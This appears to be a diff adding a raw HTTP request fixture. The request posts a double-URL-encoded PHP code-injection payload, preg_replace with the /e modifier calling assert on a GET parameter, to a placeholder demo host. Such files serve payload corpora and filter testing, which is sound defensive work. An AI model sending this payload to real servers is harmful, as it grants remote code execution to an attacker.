@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Connection: close
+
+name=preg_replace%2528%2527%252Fa%252Fe%2527%252C%2527assert%2528%2524_GET%255B1%255D%2529%2527%252C%2527a%2527%2529
